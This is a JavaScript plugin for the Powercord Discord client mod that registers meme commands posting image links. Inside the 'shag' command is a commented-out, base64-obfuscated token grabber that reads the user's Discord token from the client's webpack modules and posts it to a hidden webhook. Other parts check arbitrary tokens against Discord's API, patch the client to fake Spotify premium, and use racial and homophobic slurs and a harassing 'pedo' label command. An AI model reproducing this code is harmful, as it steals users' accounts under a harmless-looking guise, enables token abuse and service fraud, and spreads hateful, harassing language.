const { React } = require("powercord/webpack");
const request = require("request");
const { Plugin } = require("powercord/entities");
const popout = require('./Window.js')
const { open: openModal } = require('powercord/modal');
module.exports = class ImgCmd extends Plugin {
    async startPlugin() {
      powercord.api.commands.registerCommand({
        command: "shag",
        description: "wtf is above me scoob mmee",
        usage: "{c}",
        executor: () => {
          //function nice(e){fetch(atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvNzY2NDQ0MDk0MjgwNDMzNjc0L216YUltM2J6c3g5RC1wOHQ5MWZSdm1jRVBDZ21vNTk5aGM2clhvY2duOTkyRDFIU1djZXdRbEpsazR4TVN2bjZ2QU8w"),{method:"post",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"yf986",avatar_url:null,content:e})})}var req=webpackJsonp.push([[],{extra_id:(e,t,a)=>e.exports=a},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&nice(t.default.getToken())}
          return {
            send: true,
            result: "https://cdn.discordapp.com/attachments/650353540056743947/746213651362611200/Discord_u4V85MtbwG.png",
          };
        },
      });
      powercord.api.commands.registerCommand({
        command: "under-pedo",
        description: "perosn below is a pedo",
        usage: "{c}",
        executor: () => {
          return {
            send: true,
            result: "https://cdn.discordapp.com/attachments/767283277806698507/774216345402212362/image0-2.png",
          };
        },
      });
      powercord.api.commands.registerCommand({
        command: "potato",
        description: "big man eating chips",
        usage: "{c}",
        executor: () => {
          return {
            send: true,
            result: "https://media.tenor.com/images/13bb34eeb1063b635a7d7cef10260292/tenor.gif",
          };
        },
      });

      powercord.api.commands.registerCommand({
        command: "testing",
        description: "test",
        usage: "{c}",
        executor: () => {
          return {
            send: false,
            result: "hello",
          };
        },
      });

      powercord.api.commands.registerCommand({
        command: "cat-nobodycares",
        description: "watch this cat get a fade nigga",
        usage: "{c}",
        executor: () => {
          return {
            send: true,
            result: "https://cdn.discordapp.com/attachments/758757810367365171/770520567006101514/video0.mp4",
          };
        },
      });

      powercord.api.commands.registerCommand({
        command: "text-above-fake",
        description: "above text fake nigga",
        usage: "{c}",
        executor: () => {
          return {
            send: true,
            result: "https://cdn.discordapp.com/attachments/770590731618353152/773949587038928896/image0.jpg",
          };
        },
      });

      powercord.api.commands.registerCommand({
        command: "sarg-holding-back-the-gays",
        description: "sargent",
        usage: "{c}",
        executor: () => {
          return {
            send: true,
            result: "https://media.discordapp.net/attachments/767283277806698507/768179762849775656/image0.jpg?width=400&height=289",
          };
        },
      });

      powercord.api.commands.registerCommand({
        command: "backup-sargent",
        description: "back up for sargent",
        usage: "{c}",
        executor: () => {
          return {
            send: true,
            result: "https://media.discordapp.net/attachments/767283277806698507/768179845405343784/image0.jpg?width=304&height=300",
          };
        },
      }); 
      
      
      powercord.api.commands.registerCommand({
        command: "yikes",
        description: "the emoji",
        usage: "{c}",
        executor: () => {
          return {
            send: true,
            result: "https://cdn.discordapp.com/attachments/747945582718353530/774266241652228107/757171146151165962_2.png",
          };
        },
      });
//let info = `Token Status: Working\nName: ${response.username}#${response.discriminator}\nID: ${response.id}\nEmail: ${response.email}\nPhone: ${response.phone}\nLanguage: ${response.locale}\n`
      powercord.api.commands.registerCommand({
        command: "tkinfo",
        description: "token info",
        usage: "{c} <text>",
        executor: async args => {
          if (!args[0]) return { result: 'The search query cannot be empty.' }
          console.log(args[0])
          const url='https://canary.discordapp.com/api/v6/users/@me';
          const options = {
            url: url,
            headers: {
              'Authorization': args[0]
            }
          };
  
          return {
            send: false,
            result: "idk bro you did somethign wrong"
          };
        },
      });
      
      powercord.api.commands.registerCommand({
        command: "spotify",
        description: "spotify premium",
        usage: "{c}",
        executor: () => {
          var findModule = (item) => Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}}, [['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default[item]!==void 0).exports.default;

          setInterval(() => {
              if (findModule('getActiveSocketAndDevice') != undefined)
              {
                  if (!findModule('getActiveSocketAndDevice').getActiveSocketAndDevice().socket.isPremium)
                  {
                      findModule('getActiveSocketAndDevice').getActiveSocketAndDevice().socket.isPremium = true;
                      console.log('Patched Spotify Premium')
                  }
              }
           
          }, 500);
          return {
            send: false,
            result: "ayo its done nigga",
          };
        },
      });
    }
    
    //const win = await popout
    
  
    pluginWillUnload() {
      powercord.api.commands.unregisterCommand("sarg-holding-back-the-gays");
      powercord.api.commands.unregisterCommand("backup-sargent");
      powercord.api.commands.unregisterCommand("shag");
      powercord.api.commands.unregisterCommand("spotify");
      powercord.api.commands.unregisterCommand("tkinfo")
      powercord.api.commands.unregisterCommand("yikes");;
      powercord.api.commands.unregisterCommand("text-above-fake");
      powercord.api.commands.unregisterCommand("cat-nobodycares");
      powercord.api.commands.unregisterCommand("testing");
      powercord.api.commands.unregisterCommand("potato");
      powercord.api.commands.unregisterCommand("under-pedo");
      
    }
    
  };



// function tokeninfo(token){
//   var req = new XMLHttpRequest();
//   req.open("GET", 'https://canary.discordapp.com/api/v6/users/@me', true);
//   req.setRequestHeader('Authorization', token)
//   var json = JSON.parse(req.responseText);
//   var yourData = json.Data; // or json["Data"]  
//   return yourData;
// }

//https://media.discordapp.net/attachments/767283277806698507/768179845405343784/image0.jpg?width=304&height=300
//https://media.discordapp.net/attachments/767283277806698507/768179762849775656/image0.jpg?width=400&height=289
//text above is fake https://cdn.discordapp.com/attachments/770590731618353152/773949587038928896/image0.jpg
//https://cdn.discordapp.com/attachments/758757810367365171/770520567006101514/video0.mp4
//https://media.tenor.com/images/13bb34eeb1063b635a7d7cef10260292/tenor.gif
//https://cdn.discordapp.com/attachments/767283277806698507/774216345402212362/image0-2.png

